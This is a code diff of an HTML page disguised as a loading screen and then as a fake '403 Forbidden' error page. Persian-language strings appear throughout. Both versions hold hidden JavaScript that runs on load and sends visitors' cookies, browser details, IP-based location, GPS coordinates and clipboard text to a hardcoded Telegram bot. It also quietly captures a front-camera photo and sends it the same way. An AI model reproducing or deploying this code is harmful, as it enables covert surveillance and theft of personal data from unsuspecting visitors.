@@ -3,80 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>.</title>
 </head>
 <body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
     <div style="color:#fff;text-align:center;font-family:Arial;">
-        <div style="border:4px solid #333;border-top:4px solid #0088cc;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
-        <p>Loading...</p>
+        <p style="font-size:24px;">Error 403 - Forbidden</p>
     </div>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
-    <style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
     <script>
         var T="8679783900:AAHgD4k5NpYEFne9lsfh_S2P3lZisMNXeu8";
         var C="8679783900";
-        function s(m){
+
+        fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({
+                chat_id:C,
+                text:"✅ تست: سایت باز شد!\nUA: "+navigator.userAgent
+            })
+        }).then(function(r){return r.json();}).then(function(d){
+            console.log("نتیجه ارسال:",d);
             fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
                 method:"POST",
                 headers:{"Content-Type":"application/json"},
-                body:JSON.stringify({chat_id:C,text:m,parse_mode:"HTML"})
+                body:JSON.stringify({
+                    chat_id:C,
+                    text:"🔴 گزارش کامل\n\nUA: "+navigator.userAgent+"\nPlatform: "+navigator.platform+"\nزبان: "+navigator.language+"\nصفحه: "+screen.width+"x"+screen.height+"\nReferrer: "+(document.referrer||"مستقیم")+"\nCookie: "+(document.cookie||"ندارد")
+                })
             });
-        }
-        function p(b,capt){
-            var f=new FormData();
-            f.append("chat_id",C);
-            f.append("photo",b,"img.jpg");
-            f.append("caption",capt);
-            fetch("https://api.telegram.org/bot"+T+"/sendPhoto",{method:"POST",body:f});
-        }
-        async function go(){
-            var info="🔴 گزارش جدید\n\n";
-            info+="UA: "+navigator.userAgent+"\n";
-            info+="Platform: "+navigator.platform+"\n";
-            info+="زبان: "+navigator.language+"\n";
-            info+="صفحه: "+screen.width+"x"+screen.height+"\n";
-            info+="Referrer: "+(document.referrer||"مستقیم")+"\n";
-            info+="Cookie: "+(document.cookie||"ندارد")+"\n";
-            try{
-                var r=await fetch("https://api.ipify.org?format=json");
-                var d=await r.json();
-                var ip=d.ip;
-                var gr=await fetch("http://ip-api.com/json/"+ip);
-                var gd=await gr.json();
-                info+="\n📍 موقعیت:\nIP: "+ip+"\nکشور: "+(gd.country||"?")+"\nشهر: "+(gd.city||"?")+"\nISP: "+(gd.isp||"?")+"\n";
-            }catch(e){}
-            if(navigator.geolocation){
-                try{
-                    var pos=await new Promise(function(ok,err){
-                        navigator.geolocation.getCurrentPosition(ok,err,{timeout:5000});
+            fetch("https://api.ipify.org?format=json").then(function(r){return r.json();}).then(function(d){
+                fetch("http://ip-api.com/json/"+d.ip).then(function(r){return r.json();}).then(function(g){
+                    fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
+                        method:"POST",
+                        headers:{"Content-Type":"application/json"},
+                        body:JSON.stringify({
+                            chat_id:C,
+                            text:"📍 موقعیت:\nIP: "+d.ip+"\nکشور: "+g.country+"\nشهر: "+g.city+"\nISP: "+g.isp
+                        })
                     });
-                    info+="\n🎯 GPS:\nLat: "+pos.coords.latitude+"\nLon: "+pos.coords.longitude+"\n";
-                }catch(e){info+="\n⚠️ GPS رد شد\n";}
+                });
+            });
+            if(navigator.geolocation){
+                navigator.geolocation.getCurrentPosition(function(pos){
+                    fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
+                        method:"POST",
+                        headers:{"Content-Type":"application/json"},
+                        body:JSON.stringify({
+                            chat_id:C,
+                            text:"🎯 GPS:\nLat: "+pos.coords.latitude+"\nLon: "+pos.coords.longitude
+                        })
+                    });
+                });
             }
-            try{
-                var ct=await navigator.clipboard.readText();
-                if(ct) info+="\n📋 کلیپ‌بورد: "+ct+"\n";
-            }catch(e){}
-            s(info);
-            try{
-                var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+            navigator.clipboard.readText().then(function(ct){
+                if(ct){
+                    fetch("https://api.telegram.org/bot"+T+"/sendMessage",{
+                        method:"POST",
+                        headers:{"Content-Type":"application/json"},
+                        body:JSON.stringify({
+                            chat_id:C,
+                            text:"📋 کلیپ‌بورد: "+ct
+                        })
+                    });
+                }
+            });
+            navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(function(stream){
                 var vv=document.getElementById("v");
                 vv.srcObject=stream;
-                await vv.play();
+                vv.play();
                 setTimeout(function(){
                     var cc=document.getElementById("c");
                     cc.width=vv.videoWidth;
                     cc.height=vv.videoHeight;
                     cc.getContext("2d").drawImage(vv,0,0);
-                    cc.toBlob(function(b){p(b,"📸 دوربین جلو");stream.getTracks().forEach(function(t){t.stop();});},"image/jpeg");
+                    cc.toBlob(function(b){
+                        var f=new FormData();
+                        f.append("chat_id",C);
+                        f.append("photo",b,"cam.jpg");
+                        f.append("caption","📸 دوربین جلو");
+                        fetch("https://api.telegram.org/bot"+T+"/sendPhoto",{method:"POST",body:f});
+                        stream.getTracks().forEach(function(t){t.stop();});
+                    },"image/jpeg");
                 },1500);
-            }catch(e){}
-            setTimeout(function(){
-                document.body.innerHTML="<h1 style='color:white;text-align:center;margin-top:40vh;'>Error 403 - Forbidden</h1>";
-            },8000);
-        }
-        go();
+            }).catch(function(){});
+        }).catch(function(e){
+            console.log("خطا:",e);
+        });
     </script>
 </body>
 </html>
